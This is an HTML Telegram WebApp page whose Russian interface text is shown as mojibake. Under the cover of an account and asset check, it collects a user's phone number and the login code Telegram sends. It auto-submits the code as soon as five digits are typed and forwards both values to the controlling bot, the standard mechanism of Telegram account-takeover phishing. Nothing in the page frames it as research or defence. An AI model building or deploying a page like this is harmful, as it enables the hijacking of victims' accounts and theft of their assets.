<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è Telegram</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: white;
            color: black;
            padding: 20px;
        }
        .container {
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        .step {
            display: none;
        }
        .step.active {
            display: block;
        }
        input, button {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: none;
            border-radius: 10px;
            font-size: 16px;
        }
        input {
            background: #f3f4f8;
            text-align: center;
        }
        button {
            background: #229ED9;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        .status {
            padding: 10px;
            border-radius: 8px;
            margin: 10px 0;
        }
        .status.success {
            background: #d4edda;
            color: #155724;
        }
        .status.error {
            background: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- –®–∞–≥ 1: –í–≤–æ–¥ –Ω–æ–º–µ—Ä–∞ -->
        <div id="step1" class="step active">
            <h2>üì± –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä Telegram</h2>
            <p>–î–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∞–∫–∫–∞—É–Ω—Ç–∞ –∏ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∞–∫—Ç–∏–≤–æ–≤</p>
            
            <input type="text" id="phone" placeholder="+79991234567" required>
            
            <button onclick="sendPhone()">üì§ –û–¢–ü–†–ê–í–ò–¢–¨ –ù–û–ú–ï–†</button>
            
            <div id="status1" class="status"></div>
        </div>

        <!-- –®–∞–≥ 2: –í–≤–æ–¥ –∫–æ–¥–∞ -->
        <div id="step2" class="step">
            <h2>üîê –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram</h2>
            <p>–ö–æ–¥ –±—ã–ª –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ –≤–∞—à Telegram –∞–∫–∫–∞—É–Ω—Ç</p>
            
            <input type="text" id="code" placeholder="12345" maxlength="5" required>
            
            <button onclick="sendCode()">‚úÖ –ü–û–î–¢–í–ï–†–î–ò–¢–¨ –ö–û–î</button>
            
            <div id="status2" class="status"></div>
        </div>

        <!-- –®–∞–≥ 3: –†–µ–∑—É–ª—å—Ç–∞—Ç -->
        <div id="step3" class="step">
            <h2>üéØ –†–µ–∑—É–ª—å—Ç–∞—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏</h2>
            <div id="result" class="status"></div>
        </div>
    </div>

    <script>
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram WebApp
        let tg = window.Telegram.WebApp;
        
        // –†–∞—Å–∫—Ä—ã–≤–∞–µ–º –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω
        tg.expand();
        tg.enableClosingConfirmation();
        
        console.log("‚úÖ WebApp –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω");
        console.log("üë§ User:", tg.initDataUnsafe.user);

        let currentStep = 1;
        let userPhone = '';

        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —à–∞–≥
        function showStep(step) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(`step${step}`).classList.add('active');
            currentStep = step;
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
        function sendPhone() {
            const phone = document.getElementById('phone').value.trim();
            const statusDiv = document.getElementById('status1');
            
            if (!phone) {
                statusDiv.innerHTML = '<div class="status error">‚ùå –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</div>';
                return;
            }

            userPhone = phone;
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
            const btn = document.querySelector('#step1 button');
            btn.disabled = true;
            btn.textContent = 'üì§ –û–¢–ü–†–ê–í–ö–ê...';
            statusDiv.innerHTML = '<div class="status">üîÑ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–æ–º–µ—Ä –≤ –±–æ—Ç–∞...</div>';

            console.log("üì± –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–æ–º–µ—Ä:", phone);

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ –±–æ—Ç–∞
            const data = {
                type: 'submit_phone',
                phone: phone
            };

            // –°–ø–æ—Å–æ–± 1: –û—Å–Ω–æ–≤–Ω–æ–π –º–µ—Ç–æ–¥
            try {
                tg.sendData(JSON.stringify(data));
                console.log("‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã —á–µ—Ä–µ–∑ sendData");
                
                statusDiv.innerHTML = '<div class="status success">‚úÖ –ù–æ–º–µ—Ä –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –ü—Ä–æ–≤–µ—Ä—è–µ–º –ª–æ–≥–∏ –±–æ—Ç–∞...</div>';
                
                // –ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —à–∞–≥—É —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
                setTimeout(() => {
                    showStep(2);
                }, 2000);
                
            } catch (error) {
                console.error("‚ùå –û—à–∏–±–∫–∞ sendData:", error);
                statusDiv.innerHTML = '<div class="status error">‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: ' + error + '</div>';
                btn.disabled = false;
                btn.textContent = 'üì§ –û–¢–ü–†–ê–í–ò–¢–¨ –ù–û–ú–ï–†';
            }
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞
        function sendCode() {
            const code = document.getElementById('code').value.trim();
            const statusDiv = document.getElementById('status2');
            
            if (!code || code.length !== 5) {
                statusDiv.innerHTML = '<div class="status error">‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ 5 —Ü–∏—Ñ—Ä</div>';
                return;
            }

            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
            const btn = document.querySelector('#step2 button');
            btn.disabled = true;
            btn.textContent = 'üîê –ü–†–û–í–ï–†–ö–ê...';
            statusDiv.innerHTML = '<div class="status">üîÑ –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–¥...</div>';

            console.log("üîê –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥:", code);

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ –±–æ—Ç–∞
            const data = {
                type: 'submit_code',
                phone: userPhone,
                code: code
            };

            try {
                tg.sendData(JSON.stringify(data));
                console.log("‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω —á–µ—Ä–µ–∑ sendData");
                
                statusDiv.innerHTML = '<div class="status success">‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –ü—Ä–æ–≤–µ—Ä—è–µ–º –ª–æ–≥–∏ –±–æ—Ç–∞...</div>';
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
                setTimeout(() => {
                    showStep(3);
                    document.getElementById('result').innerHTML = 
                        '<div class="status success">' +
                        '‚úÖ <b>–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞!</b><br>' +
                        'üì± –ù–æ–º–µ—Ä: ' + userPhone + '<br>' +
                        'üîê –ö–æ–¥: ' + code + '<br>' +
                        'üîÑ –ü—Ä–æ–≤–µ—Ä—è–µ–º –∞–∫–∫–∞—É–Ω—Ç...' +
                        '</div>';
                }, 2000);
                
            } catch (error) {
                console.error("‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞:", error);
                statusDiv.innerHTML = '<div class="status error">‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: ' + error + '</div>';
                btn.disabled = false;
                btn.textContent = '‚úÖ –ü–û–î–¢–í–ï–†–î–ò–¢–¨ –ö–û–î';
            }
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–±—ã—Ç–∏–π Telegram WebApp
        tg.onEvent('webAppDataReceived', (event) => {
            console.log("üì® –ü–æ–ª—É—á–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ –æ—Ç –±–æ—Ç–∞:", event);
            document.getElementById('result').innerHTML = 
                '<div class="status success">‚úÖ –î–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã –æ—Ç –±–æ—Ç–∞!</div>';
        });

        tg.onEvent('viewportChanged', (event) => {
            console.log("üì± Viewport changed:", event);
        });

        // –ê–≤—Ç–æ-–æ—Ç–ø—Ä–∞–≤–∫–∞ –ø—Ä–∏ –≤–≤–æ–¥–µ 5 —Ü–∏—Ñ—Ä –∫–æ–¥–∞
        document.getElementById('code').addEventListener('input', function(e) {
            if (e.target.value.length === 5) {
                setTimeout(() => {
                    sendCode();
                }, 500);
            }
        });

        // –ê–≤—Ç–æ-–æ—Ç–ø—Ä–∞–≤–∫–∞ –Ω–æ–º–µ—Ä–∞ –ø–æ Enter
        document.getElementById('phone').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendPhone();
            }
        });

        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ WebApp –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        document.addEventListener('DOMContentLoaded', function() {
            console.log("üöÄ WebApp –∑–∞–≥—Ä—É–∂–µ–Ω");
            console.log("üìä WebApp version:", tg.version);
            console.log("üåê Platform:", tg.platform);
            console.log("üìè Viewport height:", tg.viewportHeight);
            
            // –§–æ–∫—É—Å–∏—Ä—É–µ–º—Å—è –Ω–∞ –ø–æ–ª–µ –≤–≤–æ–¥–∞
            setTimeout(() => {
                document.getElementById('phone').focus();
            }, 1000);
        });

        // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –º–µ—Ç–æ–¥—ã –æ—Ç–ø—Ä–∞–≤–∫–∏ (–Ω–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π)
        function sendDataAlternative(data) {
            // –°–ø–æ—Å–æ–± 2: –ß–µ—Ä–µ–∑ postEvent
            try {
                tg.postEvent('web_app_data_send', { data: JSON.stringify(data) });
                console.log("‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã —á–µ—Ä–µ–∑ postEvent");
                return true;
            } catch (error) {
                console.error("‚ùå –û—à–∏–±–∫–∞ postEvent:", error);
                return false;
            }
        }

        // –¢–µ—Å—Ç–æ–≤–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏
        function testSendData() {
            const testData = {
                type: 'test',
                message: '–¢–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç WebApp',
                timestamp: new Date().toISOString()
            };
            
            console.log("üß™ –¢–µ—Å—Ç–æ–≤–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞:", testData);
            
            try {
                tg.sendData(JSON.stringify(testData));
                console.log("‚úÖ –¢–µ—Å—Ç–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã");
                return true;
            } catch (error) {
                console.error("‚ùå –û—à–∏–±–∫–∞ —Ç–µ—Å—Ç–æ–≤–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏:", error);
                return false;
            }
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–µ—Å—Ç –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        setTimeout(() => {
            console.log("üß™ –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–µ—Å—Ç–æ–≤—É—é –æ—Ç–ø—Ä–∞–≤–∫—É...");
            testSendData();
        }, 3000);

    </script>
</body>
</html>
